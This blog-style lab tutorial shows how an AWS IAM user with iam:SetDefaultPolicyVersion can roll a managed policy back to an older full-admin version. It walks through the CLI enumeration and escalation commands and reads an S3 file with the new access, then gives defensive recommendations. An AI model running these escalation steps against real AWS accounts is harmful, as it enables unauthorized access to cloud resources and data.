<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/cloud-security/" rel="category tag">Cloud Security</a></span>            </div>
            <h1 class="post-title entry-title">AWS: Abusing IAM Policy Version</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/aws-abusing-iam-policy-version/" rel="bookmark"><time class="entry-date published" datetime="2025-07-19T20:31:28+00:00">July 19, 2025</time><time class="updated" datetime="2025-07-19T20:46:49+00:00">July 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This post explores a specific issue in AWS IAM—<strong>policy versioning</strong>. If not configured properly, it can be exploited by rolling back the default policy to an earlier, more permissive version. This allows a user to gain higher privileges than intended, highlighting the need for careful policy version management.</span></p>
<h3><span style="color: #800000;">Table Of Contents</span></h3>
<p><span style="color: #000000;"><strong>About IAM Policy Versioning</strong></span></p>
<p><span style="color: #000000;"><strong>Lab Setup and Prerequisite</strong></span></p>
<p><span style="color: #000000;"><strong>Part 1: IAM Lab Setup</strong></span></p>
<ul>
<li><span style="color: #000000;">Creating Permissive Vuln_policy_version 1</span></li>
<li><span style="color: #000000;">Creating Restricted Vuln_policy_version 4</span></li>
</ul>
<p><span style="color: #000000;"><strong>Part 2: Enumeration and Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">Prerequisite for Pentest</span></li>
<li><span style="color: #000000;">AWS CLI Setup &amp; Policy Enumeration Using IAM User Credentials</span></li>
<li><span style="color: #000000;">IAM Policy Versioning Exploitation</span></li>
</ul>
<p><span style="color: #000000;"><strong>Analysis</strong></span></p>
<p><span style="color: #000000;"><strong>Recommendations </strong></span></p>
<p><span style="color: #000000;"><strong>Conclusion</strong></span></p>
<h3><span style="color: #800000;">About IAM Policy Versioning</span></h3>
<p><span style="color: #000000;">When a customer-managed or AWS-managed policy is updated, IAM creates a new version instead of replacing the existing one. Up to <strong>five versions</strong> are supported for customer-managed policies. <strong>Inline </strong><strong>policies</strong>, in contrast, are directly attached to a single user, group, or role, cannot be reused, and do <strong>not support versioning.</strong></span></p>
<p><span style="color: #000000;">To set a policy’s default version, the required permissions correspond to the AWS API operations are <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-versioning.html">CreatePolicyVersion or SetDefaultPolicyVersion</a></strong></span>. You can use either one</span></p>
<ul>
<li><span style="color: #000000;">The <strong>iam:CreatePolicyVersion</strong> action allows creating a new version and setting it as the default.</span></li>
<li><span style="color: #000000;">The<strong> iam:SetDefaultPolicyVersion </strong>action allows setting any existing version as the default.</span></li>
</ul>
<p><span style="color: #000000;">Granting these permissions enables users to change which version of a policy is active.</span></p>
<h3><span style="color: #800000;">Lab Setup and Prerequisites</span></h3>
<ol>
<li><span style="color: #000000;">An AWS Account</span></li>
<li><span style="color: #000000;">VM Kali Linux</span></li>
</ol>
<p><span style="color: #000000;">If you are new to AWS platform, it is recommended to go through the AWS Lab setup <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/aws-penetration-testing-lab-setup/">here</a></span></strong>,</span></p>
<h3><span style="color: #800000;">Part 1: IAM Lab Setup</span></h3>
<p><span style="color: #000000;">Here are the instructions for setting up the environment. We will access the AWS console and configure the AWS Command Line Interface (CLI).</span></p>
<p><span style="color: #000000;"><strong>User:</strong></span></p>
<p><span style="color: #000000;">Igt_sanjeet</span></p>
<p><span style="color: #000000;"><strong>Policy name:</strong></span></p>
<p><span style="color: #000000;">Vuln_policy_version</span></p>
<h4><span style="color: #800000;">Creating Permissive Vuln_policy_version 1:</span></h4>
<p><strong><span style="color: #000000;">To set the default version of a customer managed policy</span></strong></p>
<ol>
<li><span style="color: #000000;">Firstly, Navigate to <strong>IAM &gt; Policies</strong> <strong>&gt;</strong> <strong>Create policy</strong>. Specify permissions on the Policy Editor.</span></li>
<li><span style="color: #000000;">Write a custom policy which grants the full administrative permissions and later it will be used as an <strong>escalation path.</strong></span></li>
</ol>
<ul>
<li style="list-style-type: none;">
<ul>
<li><span style="color: #000000;"><strong>Effect</strong>: Allow -&gt; Grants permissions, not denying.</span></li>
<li><span style="color: #000000;"><strong>Action</strong>: “*” -&gt; Allows <em>all</em> actions across all AWS services.</span></li>
<li><span style="color: #000000;"><strong>Resource</strong>: “*” -&gt; Applies to <em>all</em> resources in the account.</span></li>
</ul>
</li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}</pre>
<p><span style="color: #000000;">This is how the policy looks like on policy editor</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4J3IJrLO7QPwYaAgmvQovvA4uALLV9e_QZJOXIoMcx2iESWMww_6THInghf5DzKTrCxVSuQijV8qmpN3mxgDgenyiSQgyCh9JN97UrO_hyxlHKoVZrL-URauBKrpNg7cK77QN7d0pndXVgF_6R4bZx8RUuY8qcLfKu7hlMGqHjGgFrXrp_L9Y88hVBLcU/s16000/2.png" alt="AWS IAM Policy Version Privilege Escalation" width="755" height="471"/></span></p>
<ol start="3">
<li><span style="color: #000000;">On <strong>Review and create</strong>, add policy details such as policy name <strong>Vuln_policy_version </strong>and descriptions as shown</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7W-Hu1288khi8-fQ18w8l_L0uUlbxnM3BhnXxgVHo49jxO-aAhmJ6oz3ZoOjPp_t0ir-EyQKKHo5OfO6y5W5f4O3xS7td16PI4jlQLH7GcJgFiwYp1mOGkiVMPWMsB787iUYb4z3kIIL19G2rz2qz_S94dsevfDLDdbcD-s7XK1AXCDw5_PcygauICY_g/s16000/3.png"/></span></p>
<ol start="4">
<li><span style="color: #000000;">Then, go back on Policies under IAM and search for the created policy, it should appear under Policy name.</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEha9EQmNM_SzYnipNv8yZNQDmioSpodd4VFJDV_Y30Kr_6D5cr_59Wl8P2UC8p5wwuaVDbHGsuUrXlinpiUJcpIL414Gq_5hyAmZVq2eoHwor5QBa0jYifjzm-Kj4y6Ppvx-OkzBKHLZdM5ru9XIEBDvBdqYInO4bgz1o52aOG1jczOGgOqvbl-W3uTN_cR/s16000/4.png" alt="AWS IAM Policy Version Privilege Escalation" width="1197" height="519"/></span></p>
<h4><span style="color: #800000;">Creating Restricted Vuln_policy_version 4:</span></h4>
<ol>
<li><span style="color: #000000;">Firstly, click on the policy name, Vuln_policy_version to view its complete details. Under policy versions, default <strong>version 1</strong> can be seen. Press Edit</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGOSKgfb0Y6jqBgEvUcq_oSKHaOdlJSjV4dJk1zncvh3yj-IM1PLH8Jt3U9AhvfqnykOjZG1_sm2i8aiEi1LnCtGEblql0i-v2fS4lvhgT-TMvGBWFJZ_m-oUDNSQ7xk81UENk3tjfpiVy5cbN8cHtjEjcvcydupkvyHPdorzKl8Or39B_8rByRMuWXElg/s16000/5.png"/></span></p>
<ol start="2">
<li><span style="color: #000000;">Policy editor will again pop-up under <strong>Modify permissions in Vuln_policy_version.</strong> Write a custom policy which grants the restricted permissions.</span></li>
</ol>
<ul>
<li style="list-style-type: none;">
<ul>
<li><span style="color: #000000;"><strong>iam:ListPolicyVersions</strong> – Lists all versions of a specified IAM policy.</span></li>
<li><span style="color: #000000;"><strong>iam:SetDefaultPolicyVersion</strong> – Sets a specific policy version as the default version.</span></li>
<li><span style="color: #000000;"><strong>iam:ListAttachedUserPolicies</strong> – Lists the managed policies attached to a specified IAM user.</span></li>
<li><span style="color: #000000;"><strong>iam:ListPolicies</strong> – Lists all IAM managed policies in your AWS account.</span></li>
<li><span style="color: #000000;"><strong>iam:GetPolicyVersion</strong> – Retrieves details about a specific version of an IAM policy.</span></li>
</ul>
</li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "iam:ListPolicyVersions",
                "iam:SetDefaultPolicyVersion",
                "iam:ListAttachedUserPolicies",
                "iam:ListPolicies",
                “iam:GetPolicyVersion”
            ],
            "Resource": "*"
        }
    ]
}</pre>
<p><span style="color: #000000;">This is how the policy appears on Policy editor.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbMN96ZTtypwDCi_cC-b2OKpo4FOr-yOJiCClH66VuU2hFmgRTPqvB5oepd-NwGsAMptMXFJP0Dcsr1892UQy-fAzHFLEHt9Cke2dsSl-ieOgX9qX29nVMkTJBk6NP1J2KobZRENCBurLhchQQ5eOpMtsoTMvcdlruZx3AGLOr1lknn72jih4k_SP-X1yW/s16000/6.png" alt="AWS IAM Policy Version Privilege Escalation" width="948" height="511"/></span></p>
<ol start="3">
<li><span style="color: #000000;">Then, Go to <strong>Policies</strong>, select <strong>Vuln_policy_version</strong>, and open the <strong>Policy versions</strong> tab. Check version v4 and click <strong>Set as default</strong>.</span></li>
</ol>
<p><span style="color: #000000;">Here, it’s clearly written that <strong>whenever a policy is updated, a new version is created</strong> and customer can save up to 5 versions of customer managed policy.</span></p>
<p><span style="color: #000000;"> <strong>Note:</strong></span></p>
<p><span style="color: #000000;">You can delete any managed policy version except the default. Version identifiers (e.g., v1, v2) remain unchanged, so they may not be in sequential order.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNsPqrbS26RndKnT7zANz4vfI9Av68ybMdS8Z77uMgAJL7VGqfpqwOfbWBphjwh3TTobFei39WkCs1zDDfSikudibXWx7vkf_SEhV3gpjTdsVZeDHpAuc1z9DmOAlWfLKKY4DBkQY62GeNGGE0u-j0yEaXLODDt6rJnJKjpXdE_KLIgtdCok3GF8QXn-TW/s16000/7.png"/></span></p>
<ol start="4">
<li><span style="color: #000000;">Go to <strong>IAM &gt; Users &gt; Create user</strong>. Enter the user details, then choose <strong>Attach policies directly</strong> under <strong>Set Permissions</strong>. Select <strong>Vuln_policy_version</strong> from the list, then click <strong>Next</strong>.</span></li>
</ol>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdDcqjZZ0HMbU01yX5aizMVH9dMJI82-5f_d-jU7Z0CnCpc2IdOh7Gs64wipQJf5au6x_WAXolRBAUJmpZgMwIf9wEoOcGWs1tHZnGxobd8s6L28jQ0DTBD-rwc5mjGV_RPZ2regYcdt99a1vsWmawGwuVL8troGTbVa9W5kUVntTjmqQoaywostMPAAJN/s16000/8.png" alt="AWS IAM Policy Version Privilege Escalation" width="1221" height="613"/></span></p>
<ol start="5">
<li><span style="color: #000000;">Finally, go to IAM &gt; Users. select <strong>Igt_sanjeet </strong>and click<strong> Create access key</strong>. Now <strong>download the .csv file</strong> containing the Access Key ID and Secret Access Key. <strong>Keep these credentials secure.</strong></span></li>
</ol>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtc9yZn2rEYPRUDjrrQJkEUUx9eAPW8jFGrKW-jzOPbW3sN3kO503mpcVtt0mSy3huu0aCU3GuEaXTg4NnKTTm924iBeyzXVYX9RosKZ2olGeKhZNSDhOfE0Wk3qt5_tvfl-Tq9zxZXJqJwiNFf_kGWua8mWLkPuqhdS1pPpUQ3CwQ3KZRVwENXVkQAxce/s16000/9.png"/></strong></span></p>
<h3><span style="color: #800000;">Part 2: Enumeration and Exploitation</span></h3>
<p><span style="color: #000000;"><strong>The Security Impact of Mismanaged Policy Versions</strong></span></p>
<p><span style="color: #000000;">In real world scenario, mismanaged policy versions increase security risks by allowing outdated permissions to persist, which can lead to data breaches and compliance violations. Inadequate change control makes tracking changes and enforcing current, secure policies difficult.</span></p>
<p><span style="color: #000000;"><strong>Note:</strong></span></p>
<p><span style="color: #000000;">To prevent a user from making changes to the default version of a policy, you must deny both <strong>iam:CreatePolicyVersion</strong> and <strong>iam:SetDefaultPolicyVersion</strong>. AWS IAM Best Practices</span></p>
<h4><span style="color: #800000;">Prerequisite for Pentest</span></h4>
<ul>
<li><span style="color: #000000;">Pentest Machine: Kali Linux</span></li>
<li><span style="color: #000000;">Test Credentials: Igt_sanjeet user’s Access Key + Secret + Region</span></li>
<li><span style="color: #000000;">Tools: AWS-Cli (sudo apt install awscli)</span></li>
</ul>
<h4><span style="color: #800000;">AWS CLI Setup &amp; Policy Enumeration Using IAM User Credentials</span></h4>
<p><span style="color: #000000;">Configure AWS CLI profile with the Igt_sanjeet credentials. It prompts to enter AWS Access Key ID, AWS Secret Access Key, default region.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws configure --profile Igt_sanjeet</pre>
<p><span style="color: #000000;">Then, hit the ground running: the command confirms that user Igt_sanjeet has the Vuln_policy_version policy attached. Note the <strong>PolicyArn</strong> highlighted in the screenshot.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-attached-user-policies --user-name Igt_sanjeet --profile Igt_sanjeet</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjilQPb0kF3uRwG7VaNl6RkjqzRosfe8dWXJemmagX7cxEKaNbRErw2Ov7h-Hn3lLkUXbLJB5QSeWTZk7AjU8K7HaUdmQBMSulMtSrsy79V9AqVFHo0wE78H2mvTW-iNkH9ZtXhZel62UZNoXJZKd3RNjPGdgsHp7TfoWclHUqXOBiq-KWXZnyDfNv0rn7s/s16000/10.png" alt="AWS IAM Policy Version Privilege Escalation" width="1061" height="414"/></span></p>
<p><span style="color: #000000;">Then, get all the versions of the Vuln_policy_version by the following command and the result clearly shows the version Id v1 and v4 with “v4” set as default</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-policy-versions --policy-arn $POLICY_ARN --profile Igt_sanjeet</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXmi_bBrfSKQOwaFhexOoRhNVM6lj2ANFNXG-HNBfLgJOP9gZSCIy7o7thL4dGYKlXZHWYhLWRIME75Kgz96uKzpH0Pi1AegXAMkh-B7HEyOs-yWODb82qoL1XFBiE01T8qkKWq-FvuBZZORbIDZRj0sza3SFCvrxqBiCm6O5Ep9ApLdI0xGYVXjglrRVp/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Running this command brings the full details of a specific version of the IAM policy like the Policy version, creation date etc.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam get-policy-version --policy-arn arn:aws:iam::513869214449:policy/Vuln_policy_version --version-id v4 --profile Igt_sanjeet</pre>
<p><span style="color: #000000;">After running this command, note the output showing an overly permissive policy with wildcards (*) for both actions and resources, allowing all actions on all resources. <strong>A privilege escalation risk.</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam get-policy-version --policy-arn arn:aws:iam::513869214449:policy/Vuln_policy_version --version-id v1 --profile Igt_sanjeet</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNra-ocoBwd7zG8bs_L-q7Lr0G5VyxRDQXrJqzvvbqEVkwBBamZn8hoeg5QSGLst5941_-uVZVFOCBVZMLL7jUd02qwUzRHfLCIl9wttCCrGxiFyA9zAjba96orBMSYyf0B937sPNRrDkHAXlCWMxrv_UTiGog5vY9L7vvusdjSPFPQoHgIbYQtBJVKBlt/s16000/12.png" alt="AWS IAM Policy Version Privilege Escalation" width="1124" height="757"/></span></p>
<h4><span style="color: #800000;">IAM Policy Version Exploitation</span></h4>
<p><span style="color: #000000;">Now, run the command to list buckets</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws s3 ls --profile Igt_sanjeet</pre>
<p><span style="color: #000000;">This action of ListBuckets will be denied as the user Igt_sanjeet is not authorized to perform this task.</span></p>
<p><span style="color: #000000;">Then, use the second command to set the more permissive policy version v1 as the default.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam set-default-policy-version --policy-arn arn:aws:iam::513869214449:policy/Vuln_policy_version --version-id v1 --profile Igt_sanjeet</pre>
<p><span style="color: #000000;">Again, try to list buckets, and it’s a success this time as shown in the screenshot.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws s3 ls --profile Igt_sanjeet</pre>
<p><span style="color: #000000;">To make sure that the permissive Vuln_policy_version “v1” is been set as default, run the command as given and the result will confirm it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-policy-version --policy-arn arn:aws:iam::513869214449:policy/Vuln_policy_version --profile Igt_sanjeet</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmZ1X64FUr9GJhDVWwThJAyD5Q8v6EPt4CsZVapeOaHYuFKpThvp8L9BXusl51KjSCTt8EpM8hqmOC01ARWEXu6BZ5zr_LEQl_6XYDUlCYJLkawUtzy1qRzZmD24HsJOhy8vWrH7MjQC4KlGIzradjZeg-vdQC9k4fruRZu3a6Qq9DrpECf9ScqSEwXflK/s16000/13.png" alt="SetDefaultPolicyVersion vulnerability" width="1368" height="645"/></span></p>
<p><span style="color: #000000;">List your bucket and here you can see text files in output.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws s3 ls --profile Igt_raj</pre>
<p><span style="color: #000000;">Then, Download the text file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws s3 cp s3://igt-bucket/proof.txt file_admin.txt</pre>
<p><span style="color: #000000;">Display the contents of file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat file_admin.txt</pre>
<p><span style="color: #000000;"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgw82XWBOOCW2P5qXf58sy-LlVYZdzExULBZEH276TkqVX1ACkP_459DUTULDC1Pw8y0Ie157_BYG0aIi29pPjSbbmxix5K0VPQf2hzwp0rTjM45IuBQPZN6oNPkPrREPDQ_jm6XA7LSX4r7_e8y2KwN22Whvi0Cif9zfS_A6ubuJyhWUxN7pKrHiKHuwJ4/s16000/14.png" alt="AWS IAM Policy Version Privilege Escalation" width="821" height="269"/></strong></span></p>
<h3><span style="color: #800000;">Analysis</span></h3>
<p><span style="color: #000000;">This lab demonstrates privilege escalation by setting a permissive policy version as default, granting full access without altering the original policy.The escalation vector was</span></p>
<p><span style="color: #000000;"><strong>Igt_sanjeet</strong> → <strong>Denied access to </strong>s3:ListBuckets → <strong>Sets overly permissive </strong>v1<strong> as default</strong> → Retries s3 ls → <strong>Access granted</strong> →<strong> Privilege escalation achieved via default policy version abuse</strong></span></p>
<h3><span style="color: #800000;">Recommendations </span></h3>
<ul>
<li><span style="color: #000000;">Restrict iam:CreatePolicyVersion and iam:SetDefaultPolicyVersion to trusted admin roles only.</span></li>
<li><span style="color: #000000;">Apply the principle of least privilege across all IAM policies.</span></li>
<li><span style="color: #000000;">Monitor and alert on changes to IAM policy versions.</span></li>
<li><span style="color: #000000;">Use SCPs to block creation or activation of overly permissive policies.</span></li>
<li><span style="color: #000000;">Regularly audit and delete unused or outdated policy versions.</span></li>
</ul>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">This lab successfully demonstrates default policy version abuse that can lead to silent privilege escalation. Strict permission boundaries and policy version monitoring are essential to prevent such exploitation.</span></p>
<p><span style="color: #000000;">Explore more hands-on cloud security labs and techniques in our</span> <strong data-start="79" data-end="229" data-is-last-node=""><span style="color: #0000ff;"><a class="" style="color: #0000ff;" href="https://www.hackingarticles.in/category/cloud-security/" target="_new" rel="noopener" data-start="145" data-end="226">Cloud Security Archive</a></span>.</strong></p>
<p><span style="color: #000000;"><strong>Author: Fatima Aziz</strong> is an accomplished cybersecurity professional with expertise in cloud security, holding certifications like GPCS and CCSK. Contact Fatima Aziz on <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/fatimaaaziz/">LinkedIn</a></span></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
